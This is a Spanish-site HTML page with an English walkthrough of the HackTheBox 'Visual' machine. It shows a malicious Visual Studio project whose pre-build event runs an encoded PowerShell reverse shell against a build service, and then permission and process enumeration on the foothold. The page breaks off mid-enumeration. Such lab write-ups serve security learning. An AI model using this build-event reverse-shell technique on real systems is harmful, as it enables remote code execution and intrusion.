
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visual - HTB</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link href="/css/writeups.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <button class="sidebar-toggle" id="sidebarToggle">â˜°</button>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="Logo">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav flex-column">
                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
                    </ul>
                </nav>
            </aside>
            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/medium/visual/img/visual.png">
                <h2>Visual - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links" style="display: none">
                    <li><a href="https://app.hackthebox.com/machines/Visual">HackTheBox</a></li>
                </ul>
            </section>
                <section class="article-content">
                    <div class="article-container">
                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Visual</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">09</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3>About Visual</h3><br/>
<p>Visual is a medium-difficulty machine on HackTheBox. Initially, we will exploit a website that builds our custom Visual Studio projects by abusing build events to gain access as <code>enox</code>.</p><br/>
<h3>Shell as local service</h3><br/>
<p>As <code>enox</code>, we observed that the HTTP service is running under a different user. By exploiting our write privileges on the website folder, we were able to achieve command execution as <code>local service</code> using PHP.</p><br/>
<h3>Shell as administrator (system)</h3><br/>
<p>Upon searching for privilege escalation vectors, we noticed that we could recover all default <code>local service</code> privileges. One of them is <code>SeImpersonatePrivilege</code>, which we subsequently abused to gain access as the local administrator.</p><br/>
<h3>Recon</h3><br/>
<p>As always, let's start with a port scan to discover open ports on the victim machine.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.234</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.234</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65534</span> <span class="n">filtered</span> <span class="n">ports</span>
<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
</pre></div>
<p>As we can see there is only one port open. This port belongs to an HTTP service.</p><br/>
<h3>HTTP Service - Port 80</h3><br/>
<p>Before accessing the website through my browser, I will utilize <code>whatweb</code> to identify technologies and interesting information about the website.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.234</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.234</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.56</span><span class="p">],</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.56</span> <span class="p">(</span><span class="n">Win64</span><span class="p">)</span> <span class="n">OpenSSL</span><span class="o">/</span><span class="mf">1.1.1</span><span class="n">t</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">8.1.17</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.234</span><span class="p">],</span> <span class="n">OpenSSL</span><span class="p">[</span><span class="mf">1.1.1</span><span class="n">t</span><span class="p">],</span> <span class="n">PHP</span><span class="p">[</span><span class="mf">8.1.17</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Visual</span> <span class="o">-</span> <span class="n">Revolutionizing</span> <span class="n">Visual</span> <span class="n">Studio</span> <span class="n">Builds</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="p">[</span><span class="n">PHP</span><span class="o">/</span><span class="mf">8.1.17</span><span class="p">]</span>
</pre></div>
<p>There isn't much information but we can highlight that it runs PHP behind the scenes.</p><br/>
<p>When accessing the website through the web browser, you will encounter the following content:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/7.png"/></p><br/>
<p>Wappalyzer indentified the SO of the victim machine:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/8.png"/></p><br/>
<p>It is a windows system, surely windows 10.</p><br/>
<p>Upon analysing the website and its content, I noticed that it allows you to upload visual studio projects to build them:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/9.png"/></p><br/>
<p>It stands out that they support projects in .NET version 6.0 and C# programs. It also mentions that we have to share our projects through GIT repositories.</p><br/>
<p>In this section, we can enter the URL of the git repository:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/10.png"/></p><br/>
<h3>Visual Studio - Build events</h3><br/>
<p>Build events refer to the tasks that can be executed before or after the build process of a project. These events allow developers to automate certain tasks and customize the build process according to their requirements. There are two main types of build events:</p><br/>
<p><strong>Pre-Build Events:</strong> These events occur before the actual compilation and build process. Developers can specify commands or scripts to be executed as part of the pre-build events. Common use cases include tasks like copying files, generating code, or setting up the environment before compilation.</p><br/>
<p><strong>Post-Build Events:</strong> These events take place after the build process is complete. Developers can define commands or scripts to run after the successful compilation and linking of the project. Typical post-build tasks include copying the output to a specific location, creating documentation, or triggering additional processes.</p><br/>
<p>If it is true that the website builds our Visual Studio projects, we should be able to achieve command execution on the victim's machine. However, first, we have to create our own Visual Studio project.</p><br/>
<h3>Creating the malicious project</h3><br/>
<p>For this purpose, I am using a Windows VM to install Visual Studio and the .NET framework. I downloaded <a href="https://visualstudio.microsoft.com/es/vs/community/">Visual Studio 2022</a>, and since it comes with .NET version 8.0 by default, I had to install <a href="https://dotnet.microsoft.com/es-es/download/dotnet/6.0">version 6.0</a> manually.</p><br/>
<p>Once installed, we have to create a new project:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/1.png"/></p><br/>
<p>I selected the <code>Console App</code> template:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/2.png"/></p><br/>
<p>Enter the name of your choice and then click on <code>Next</code>:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/3.png"/></p><br/>
<p>Select version 6.0 of .NET:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/4.png"/></p><br/>
<p>Finally, the project was created successfully:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/11.png"/></p><br/>
<p>Now, we have to add Build Events. To achieve this, we have to click on <code>Project -&gt; Project Properties</code>:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/12.png"/></p><br/>
<p>Now on <code>Build -&gt; Events</code> I'll create a PreBuild event:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/13.png"/></p><br/>
<p>On the "Pre-build event," you have to enter the command you want to execute before building the project. In this case, I will enter any command; I will modify it later.</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/14.png"/></p><br/>
<p>Finally, we have to build the project:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/5.png"/></p><br/>
<p>As we can see, the prebuild event ran successfully:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/6.png"/></p><br/>
<p>I downloaded the project folder on my Linux machine. Now, I will modify the prebuild event with a base64-encoded PowerShell reverse shell from <a href="https://www.revshells.com/">revshells</a>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">maliciousProject</span><span class="o">.</span><span class="n">csproj</span>
<span class="o">&lt;</span><span class="n">Project</span> <span class="n">Sdk</span><span class="o">=</span><span class="s2">"Microsoft.NET.Sdk"</span><span class="o">&gt;</span>

  <span class="o">&lt;</span><span class="n">PropertyGroup</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">OutputType</span><span class="o">&gt;</span><span class="n">Exe</span><span class="o">&lt;/</span><span class="n">OutputType</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">TargetFramework</span><span class="o">&gt;</span><span class="n">net6</span><span class="mf">.0</span><span class="o">&lt;/</span><span class="n">TargetFramework</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">ImplicitUsings</span><span class="o">&gt;</span><span class="n">enable</span><span class="o">&lt;/</span><span class="n">ImplicitUsings</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">Nullable</span><span class="o">&gt;</span><span class="n">enable</span><span class="o">&lt;/</span><span class="n">Nullable</span><span class="o">&gt;</span>
  <span class="o">&lt;/</span><span class="n">PropertyGroup</span><span class="o">&gt;</span>

  <span class="o">&lt;</span><span class="n">Target</span> <span class="n">Name</span><span class="o">=</span><span class="s2">"PreBuild"</span> <span class="n">BeforeTargets</span><span class="o">=</span><span class="s2">"PreBuildEvent"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">Exec</span> <span class="n">Command</span><span class="o">=</span><span class="s2">"powershell -e JABjAGwAaQBlAG4AdAAgA...[snip]...AC4AQwBsAG8AcwBlACgAKQA="</span> <span class="o">/&gt;</span>
  <span class="o">&lt;/</span><span class="n">Target</span><span class="o">&gt;</span>

<span class="o">&lt;/</span><span class="n">Project</span><span class="o">&gt;</span>
</pre></div>
<p>To share this project with the victim machine, we need to use Git repositories. I downloaded a <a href="https://docs.gitea.com/installation/install-from-binary">pre-compiled binary</a> of Gitea and created a new project on my local Gitea server:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">init</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Initialized</span> <span class="n">empty</span> <span class="n">Git</span> <span class="n">repository</span> <span class="ow">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Visual</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">maliciousProject</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">checkout</span> <span class="o">-</span><span class="n">b</span> <span class="n">main</span>
<span class="n">Switched</span> <span class="n">to</span> <span class="n">a</span> <span class="n">new</span> <span class="n">branch</span> <span class="s1">'main'</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">add</span> <span class="o">.</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">commit</span> <span class="o">-</span><span class="n">m</span> <span class="s2">"first commit"</span>
<span class="p">[</span><span class="n">main</span> <span class="p">(</span><span class="n">root</span><span class="o">-</span><span class="n">commit</span><span class="p">)</span> <span class="mi">7484990</span><span class="p">]</span> <span class="n">first</span> <span class="n">commit</span>
 <span class="mi">35</span> <span class="n">files</span> <span class="n">changed</span><span class="p">,</span> <span class="mi">349</span> <span class="n">insertions</span><span class="p">(</span><span class="o">+</span><span class="p">)</span>
 <span class="n">create</span> <span class="n">mode</span> <span class="mi">100644</span> <span class="o">.</span><span class="n">vs</span><span class="o">/</span><span class="n">maliciousProject</span><span class="o">/</span><span class="n">DesignTimeBuild</span><span class="o">/.</span><span class="n">dtbcache</span><span class="o">.</span><span class="n">v2</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
 <span class="n">create</span> <span class="n">mode</span> <span class="mi">100644</span> <span class="n">obj</span><span class="o">/</span><span class="n">maliciousProject</span><span class="o">.</span><span class="n">csproj</span><span class="o">.</span><span class="n">nuget</span><span class="o">.</span><span class="n">g</span><span class="o">.</span><span class="n">targets</span>
 <span class="n">create</span> <span class="n">mode</span> <span class="mi">100644</span> <span class="n">obj</span><span class="o">/</span><span class="n">project</span><span class="o">.</span><span class="n">assets</span><span class="o">.</span><span class="n">json</span>
 <span class="n">create</span> <span class="n">mode</span> <span class="mi">100644</span> <span class="n">obj</span><span class="o">/</span><span class="n">project</span><span class="o">.</span><span class="n">nuget</span><span class="o">.</span><span class="n">cache</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">remote</span> <span class="n">add</span> <span class="n">origin</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">maliciousProject</span><span class="o">.</span><span class="n">git</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">push</span> <span class="o">-</span><span class="n">u</span> <span class="n">origin</span> <span class="n">main</span>
<span class="n">Username</span> <span class="k">for</span> <span class="s1">'http://localhost:3000'</span><span class="p">:</span> <span class="n">elswix</span>
<span class="n">Password</span> <span class="k">for</span> <span class="s1">'http://elswix@localhost:3000'</span><span class="p">:</span> 
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Before sharing the link to my new Git repo, I will set up my netcat listener on port 3001 as specified in the reverse shell.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3001</span>
</pre></div>
<p>Now, I will enter the link to my Git repo in the input field:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/15.png"/></p><br/>
<p>After a while I received the reverse shell on my netcat listener:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3001</span>
<span class="n">Connection</span> <span class="n">received</span> <span class="n">on</span> <span class="mf">10.10.11.234</span> <span class="mi">49672</span>
<span class="n">whoami</span>
<span class="n">visual</span>\<span class="n">enox</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span>\<span class="n">b98fb944a4bf4c78eb9c86836caa86</span><span class="o">&gt;</span>
</pre></div>
<p>We have successfully gained access to the system as <code>enox</code>.</p><br/>
<p>We can read <code>user.txt</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">enox</span>\<span class="n">desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">fba81</span><span class="o">**********************</span><span class="n">b123a</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">enox</span>\<span class="n">desktop</span><span class="o">&gt;</span>
</pre></div>
<p>As the user <code>enox</code>, we lack any special privileges.</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">enox</span>\<span class="n">desktop</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>

<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>   
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">========</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span> 
<span class="n">SeCreateGlobalPrivilege</span>       <span class="n">Create</span> <span class="k">global</span> <span class="n">objects</span>          <span class="n">Enabled</span> 
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span> <span class="n">Disabled</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">enox</span>\<span class="n">desktop</span><span class="o">&gt;</span>
</pre></div>
<p>While examining the directories in the system root, I noticed intriguing access permissions within the <code>C:\xampp</code> directory:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">enox</span>\<span class="n">desktop</span><span class="o">&gt;</span> <span class="n">cacls</span> <span class="n">c</span><span class="p">:</span>\<span class="n">xampp</span>
<span class="n">c</span><span class="p">:</span>\<span class="n">xampp</span> <span class="n">Everyone</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)</span><span class="n">F</span> 
         <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">F</span> 
         <span class="n">BUILTIN</span>\<span class="n">Administrators</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">F</span> 
         <span class="n">BUILTIN</span>\<span class="n">Users</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">R</span> 
         <span class="n">BUILTIN</span>\<span class="n">Users</span><span class="p">:(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)(</span><span class="n">special</span> <span class="n">access</span><span class="p">:)</span>

                               <span class="n">FILE_APPEND_DATA</span>

         <span class="n">BUILTIN</span>\<span class="n">Users</span><span class="p">:(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)(</span><span class="n">special</span> <span class="n">access</span><span class="p">:)</span>

                               <span class="n">FILE_WRITE_DATA</span>

         <span class="n">CREATOR</span> <span class="n">OWNER</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">IO</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">F</span> 

<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">enox</span>\<span class="n">desktop</span><span class="o">&gt;</span>
</pre></div>
<p><code>FILE_APPEND_DATA</code>: This permission allows a user or group to append data to a file. Users with this permission can add new information to the end of a file without altering the existing content.</p><br/>
<p><code>FILE_WRITE_DATA</code>: This permission grants the ability to modify or overwrite the existing data within a file. Users with this permission can make changes to the content of the file, including both appending new data and overwriting existing data.</p><br/>
<p>In summary, we have file modification privileges within the <code>C:\xampp</code> directory.</p><br/>
<h3>Shell as local service</h3><br/>
<p>The website folder is located in <code>C:\xampp\htdocs</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="n">ls</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span>

    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span>


<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>                                                                  
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>                                                                  
<span class="n">d</span><span class="o">-----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">32</span> <span class="n">AM</span>                <span class="n">assets</span>                                                                
<span class="n">d</span><span class="o">-----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">32</span> <span class="n">AM</span>                <span class="n">css</span>                                                                   
<span class="n">d</span><span class="o">-----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">32</span> <span class="n">AM</span>                <span class="n">js</span>                                                                    
<span class="n">d</span><span class="o">-----</span>        <span class="mi">2</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2024</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">53</span> <span class="n">AM</span>                <span class="n">uploads</span>                                                               
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">6</span><span class="p">:</span><span class="mi">20</span> <span class="n">PM</span>           <span class="mi">7534</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>                                                             
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">2</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2024</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">53</span> <span class="n">AM</span>           <span class="mi">1618</span> <span class="n">submit</span><span class="o">.</span><span class="n">php</span>                                                            
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">4</span><span class="p">:</span><span class="mi">11</span> <span class="n">PM</span>           <span class="mi">4970</span> <span class="n">vs_status</span><span class="o">.</span><span class="n">php</span>                                                         


<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span>
</pre></div>
<p>At this point, with file modification privileges throughout the entire <code>C:\xampp</code> directory, I thought it could be interesting to check who is running the HTTP service. Initially, I assumed it would be <code>enox</code> since we gained access to the system as that user, but I was not sure at all. </p><br/>
<p>While executing <code>tasklist /v</code>, I observed that the <code>httpd.exe</code> process was not being run under the context of the user <code>enox</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="n">tasklist</span> <span class="o">/</span><span class="n">v</span> <span class="o">|</span> <span class="n">findstr</span> <span class="s2">"http"</span>
<span class="n">httpd</span><span class="o">.</span><span class="n">exe</span>                     <span class="mi">2260</span>                            <span class="mi">0</span>     <span class="mi">21</span><span class="p">,</span><span class="mi">076</span> <span class="n">K</span> <span class="n">Unknown</span>         <span class="n">N</span><span class="o">/</span><span class="n">A</span>                                                     <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>                                                                     
<span class="n">httpd</span><span class="o">.</span><span class="n">exe</span>                     <span class="mi">3480</span>                            <span class="mi">0</span>     <span class="mi">8</span><span class="p">,</span><span class="mi">120</span> <span class="n">K</span> <span class="n">Unknown</span>         <span class="n">N</span><span class="o">/</span><span class="n">A</span>                                                     <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>                                                                   
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span>
</pre></div>
<p>You can also use the <a href="https://stackoverflow.com/questions/41960800/get-process-and-process-owner">following commands</a> to check it:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="err">$</span><span class="n">owners</span> <span class="o">=</span> <span class="o">@</span><span class="p">{}</span> 
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="n">gwmi</span> <span class="n">win32_process</span> <span class="o">|%</span> <span class="p">{</span><span class="k">try</span> <span class="p">{</span><span class="err">$</span><span class="n">owners</span><span class="p">[</span><span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="n">handle</span><span class="p">]</span> <span class="o">=</span> <span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="n">getowner</span><span class="p">()</span><span class="o">.</span><span class="n">user</span><span class="p">}</span> <span class="n">catch</span><span class="p">{}</span> <span class="p">}</span> 
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">get</span><span class="o">-</span><span class="n">process</span> <span class="o">|</span> <span class="n">select</span> <span class="n">processname</span><span class="p">,</span><span class="n">Id</span><span class="p">,</span><span class="o">@</span><span class="p">{</span><span class="n">l</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="n">e</span><span class="o">=</span><span class="p">{</span><span class="err">$</span><span class="n">owners</span><span class="p">[</span><span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="n">id</span><span class="o">.</span><span class="n">tostring</span><span class="p">()]}})</span>

<span class="n">ProcessName</span>           <span class="n">Id</span> <span class="n">Owner</span>
<span class="o">-----------</span>           <span class="o">--</span> <span class="o">-----</span>
<span class="n">cmd</span>                  <span class="mi">264</span> <span class="n">enox</span> 
<span class="n">cmd</span>                  <span class="mi">964</span> <span class="n">enox</span> 
<span class="n">conhost</span>             <span class="mi">1256</span> <span class="n">enox</span> 
<span class="n">conhost</span>             <span class="mi">1964</span> <span class="n">enox</span> 
<span class="n">conhost</span>             <span class="mi">2868</span> <span class="n">enox</span> 
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>   
<span class="n">httpd</span>               <span class="mi">2260</span>      
<span class="n">httpd</span>               <span class="mi">3480</span>      
<span class="n">Idle</span>                   <span class="mi">0</span>      
<span class="n">LogonUI</span>             <span class="mi">4692</span>      
<span class="n">lsass</span>                <span class="mi">632</span>      
<span class="n">MicrosoftEdgeUpdate</span>  <span class="mi">376</span>      
<span class="n">msdtc</span>               <span class="mi">2696</span>      
<span class="n">nssm</span>                <span class="mi">2716</span> <span class="n">enox</span> 
<span class="n">powershell</span>          <span class="mi">3228</span> <span class="n">enox</span> 
<span class="n">powershell</span>          <span class="mi">4208</span> <span class="n">enox</span> 
<span class="n">powershell</span>          <span class="mi">5084</span> <span class="n">enox</span> 
<span class="n">Registry</span>              <span class="mi">88</span>      
<span class="n">services</span>             <span class="mi">624</span>      
<span class="n">smss</span>                 <span class="mi">288</span>      
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>    
<span class="n">wininit</span>              <span class="mi">500</span>      
<span class="n">winlogon</span>             <span class="mi">540</span>      
<span class="n">WmiPrvSE</span>            <span class="mi">3420</span>      
